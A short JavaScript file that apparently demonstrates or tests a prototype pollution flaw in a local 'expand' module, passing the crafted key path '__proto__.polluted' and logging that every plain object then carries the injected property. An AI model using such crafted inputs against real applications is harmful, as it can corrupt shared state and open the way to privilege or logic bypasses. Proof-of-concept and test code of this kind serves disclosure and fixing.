const expand = require('../src');

console.log({}.polluted)
expand("__proto__.polluted:Polluted!");
console.log({}.polluted)